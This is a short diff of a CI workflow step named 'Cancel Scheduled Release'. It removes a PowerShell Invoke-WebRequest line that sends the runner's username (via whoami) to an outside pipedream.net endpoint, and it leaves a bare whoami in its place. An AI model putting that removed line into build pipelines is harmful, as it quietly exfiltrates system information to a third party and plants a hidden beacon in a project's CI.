@@ -43,5 +43,5 @@ jobs:
       - name: Cancel Scheduled Release
         shell: cmd 
         run: |
-          "powershell -Command "Invoke-WebRequest -Uri 'https://eodbrm8aa4yi9aq.m.pipedream.net/q?user=$(whoami)'""
+          "whoami"
 
